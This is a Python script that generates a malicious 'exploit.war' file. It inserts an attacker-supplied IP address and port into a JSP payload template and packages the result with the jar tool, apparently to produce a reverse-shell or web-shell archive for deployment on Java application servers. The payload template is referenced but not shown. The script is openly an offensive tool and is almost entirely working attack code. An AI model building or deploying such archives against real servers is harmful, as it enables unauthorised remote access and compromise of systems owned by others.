import os
import subprocess
import argparse

def checkWebXmlFile():
    webXmlFileLocation = "WEB-INF/web.xml"
    return os.path.isfile(webXmlFileLocation)
    
def generatePayload(ip, port):
    os.system("rm -rf lpojgnvmtu.jsp")
    payloadfile = open("lpojgnvmtu.jsp",'a')
    storefile = open("payload.jsp").readlines()
    for x in storefile:
        if "<IP ADDRESS>" in x:
            x = x.replace("<IP ADDRESS>",ip)
        if "<PORT NUMBER>" in x:
            x = x.replace("<PORT NUMBER>", port)
        payloadfile.write(x)

def checkJarPath():
    try:
        jarPath = subprocess.check_output("which jar", shell=True).decode()
        return jarPath
    except: 
        return None
    
def compileWarFile(jarpath):
    os.system("mkdir war")
    os.system("cp -r WEB-INF war")
    os.system("cp lpojgnvmtu.jsp war")
    os.chdir("war")
    compileCommand = "{} -cvf exploit.war *".format(jarpath)
    os.system("{} -cvf exploit.war *".format(jarpath.strip()))

def logic(ip, port):
    generatePayload(ip, port)
    print("[+] Generated malicious exploit.war file!")
    jarPath = checkJarPath()
    if jarPath is not None:
        print("[+] Obtained jar path!")
        compileWarFile(jarPath)
        print("[+] Compiled exploit.war file!")
    else:
        print("[!] jar path cannot be found!")
                
def main(ip, port):
    if checkWebXmlFile() == True:
        print("[+] Found WEB-INF/web.xml!")
        logic(ip, port)
    else:
        print("[!] WEB-INF/web.xml is missing!")
        
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--ip', help='Target IP address for local machine', required = True)
    parser.add_argument('-p', '--port', help='Target port for local machine', required = True)
    args = parser.parse_args()
    main(str(args.ip), str(args.port))